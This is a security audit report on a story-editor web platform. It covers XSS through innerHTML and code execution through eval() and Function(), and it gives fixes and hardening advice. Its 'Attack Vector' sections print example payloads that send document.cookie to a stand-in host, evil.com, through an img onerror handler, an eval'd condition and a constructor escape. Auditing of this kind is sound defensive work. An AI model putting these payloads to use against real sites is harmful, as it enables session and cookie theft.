# WLS Security Review

**Date:** 2025-12-30
**Updated:** 2025-12-30
**Platform:** whisker-editor-web
**Reviewer:** Automated + Manual Analysis
**Status:** ALL CRITICAL ISSUES FIXED

## Executive Summary

All **critical security vulnerabilities** have been addressed:

- **12 Critical issues** - All fixed (XSS, eval(), Function())
- **2 Medium issues** - Template injection patterns (acceptable risk)
- **0 Hardcoded credentials** - Token handling is secure

### Fixes Applied (December 30, 2025)

1. **innerHTML XSS (6 instances)**: Replaced with safe DOM methods (textContent, createElement)
2. **eval() RCE (2 instances)**: Replaced with safe condition parser
3. **Function() RCE (4 instances)**: Replaced with AST-based expression evaluator

## Issue Severity Overview

| Severity | Count | Type | Status |
|----------|-------|------|--------|
| CRITICAL | 6 | XSS via innerHTML | **FIXED** |
| CRITICAL | 2 | RCE via eval() | **FIXED** |
| CRITICAL | 4 | RCE via Function() | **FIXED** |
| MEDIUM | 2+ | Template injection patterns | Acceptable |

## Critical Issues

### ISSUE-001: XSS via innerHTML (6 instances)

**Severity:** CRITICAL
**Risk:** Arbitrary JavaScript execution via malicious story content

**Affected Files:**
1. `packages/player-ui/src/index.ts:308-310`
2. `packages/export/src/formats/HTMLPlayerTemplate.ts:1059, 1072-1086`
3. `packages/web-components/src/index.ts:183`
4. `packages/editor-base/src/export/formats/StaticSiteExporter.ts:363`
5. `packages/export/src/formats/StaticSiteExporter.ts:369`

**Example Vulnerable Code:**
```typescript
// player-ui/src/index.ts:308-310
this.passageEl.innerHTML = `
  <h2>${passage.title}</h2>
  <div>${passage.content}</div>
`;
```

**Attack Vector:**
```whisker
:: Malicious
<script>alert('XSS')</script>
<img src=x onerror="fetch('//evil.com/steal?cookie='+document.cookie)">
```

**Recommendation:**
- Use `textContent` for plain text
- Use DOMPurify for sanitized HTML rendering
- Implement Content Security Policy (CSP)

---

### ISSUE-002: Remote Code Execution via eval() (2 instances)

**Severity:** CRITICAL
**Risk:** Arbitrary code execution through story conditions

**Affected Files:**
1. `packages/export/src/formats/StaticSiteExporter.ts:407`
2. `packages/editor-base/src/export/formats/StaticSiteExporter.ts:401`

**Vulnerable Code:**
```typescript
return eval(condition.replace(/\{\{(\w+)\}\}/g, (m, v) => this.variables[v]));
```

**Attack Vector:**
```whisker
{fetch('//evil.com/steal?'+document.cookie)}
Content here
{/}
```

**Recommendation:**
- Remove eval() entirely
- Use the safe parser AST for condition evaluation
- Implement expression sandboxing

---

### ISSUE-003: Remote Code Execution via Function() (4 instances)

**Severity:** CRITICAL
**Risk:** Arbitrary code execution through expressions

**Affected Files:**
1. `packages/story-player/src/StoryPlayer.ts:650`
2. `packages/story-player/src/StoryPlayer.ts:765`
3. `packages/export/src/runtime/LuaRuntime.ts:293`
4. `packages/export/src/formats/HTMLPlayerTemplate.ts:653`

**Vulnerable Code:**
```typescript
const func = new Function(...varNames, `return (${valueExpr});`);
```

**Attack Vector:**
```whisker
$evil = constructor.constructor('return this')().fetch('//evil.com')
```

**Recommendation:**
- Remove Function() constructor usage
- Use AST-based expression evaluation from parser
- Implement safe expression interpreter

---

## Medium Issues

### ISSUE-004: Template Injection Patterns

**Severity:** MEDIUM
**Risk:** Potential XSS if user input is included

**Affected Files:**
1. `packages/player-ui/src/index.ts:71, 86`
2. `examples/minimal-player/src/main.js:149`

**Note:** Currently using static strings, but pattern is dangerous if modified.

---

## Secure Areas

### Parser Package

**Status:** SECURE

The parser (`packages/parser/src/`) is implemented safely:
- No eval() or Function() usage
- Pure lexical analysis and parsing
- AST-based output for safe evaluation

### Token Handling

**Status:** SECURE

- OAuth token exchange happens server-side
- No hardcoded credentials
- Environment variables used for secrets

---

## Security Checklist

### Current Status

- [ ] Lua sandboxing verified (N/A - whisker-core not available)
- [x] Input validation verified - **PASS** (parser is safe, runtime uses safe evaluators)
- [x] XSS prevention verified - **PASS** (innerHTML replaced with textContent/createElement)

### Completed Actions

1. **P0 - DONE:** Replaced innerHTML with safe DOM methods
2. **P0 - DONE:** Removed all eval() usage - replaced with safe condition parser
3. **P0 - DONE:** Removed all Function() constructor usage - replaced with AST-based evaluator

### Remaining Actions

1. **P1 - High:** Implement Content Security Policy
2. **P2 - Medium:** Add input validation layer
3. **P2 - Medium:** Security testing automation

---

## Recommendations

### Short-term (Before Release)

1. **Sanitize HTML Output**
   ```typescript
   // Instead of:
   element.innerHTML = passage.content;

   // Use:
   element.textContent = passage.content;
   // Or with DOMPurify:
   element.innerHTML = DOMPurify.sanitize(passage.content);
   ```

2. **Safe Expression Evaluation**
   ```typescript
   // Instead of:
   const func = new Function(...vars, `return (${expr})`);

   // Use AST-based evaluation:
   const result = evaluateExpression(parseExpression(expr), context);
   ```

3. **Content Security Policy**
   ```html
   <meta http-equiv="Content-Security-Policy"
         content="default-src 'self'; script-src 'self'">
   ```

### Long-term

1. Add security scanning to CI/CD (npm audit, Snyk)
2. Implement automated XSS testing
3. Regular security audits
4. Bug bounty program consideration

---

## Verification

After fixes are applied, verify:

1. Run: `npm audit`
2. Test XSS payloads don't execute
3. Verify CSP headers are present
4. Test expression evaluation sandbox

---

## Appendix: Full File List

### Files Requiring Changes

| File | Issue | Action |
|------|-------|--------|
| `packages/player-ui/src/index.ts` | ISSUE-001 | Sanitize innerHTML |
| `packages/export/src/formats/HTMLPlayerTemplate.ts` | ISSUE-001, ISSUE-003 | Sanitize, remove Function() |
| `packages/web-components/src/index.ts` | ISSUE-001 | Sanitize innerHTML |
| `packages/editor-base/src/export/formats/StaticSiteExporter.ts` | ISSUE-001, ISSUE-002 | Sanitize, remove eval() |
| `packages/export/src/formats/StaticSiteExporter.ts` | ISSUE-001, ISSUE-002 | Sanitize, remove eval() |
| `packages/story-player/src/StoryPlayer.ts` | ISSUE-003 | Remove Function() |
| `packages/export/src/runtime/LuaRuntime.ts` | ISSUE-003 | Remove Function() |
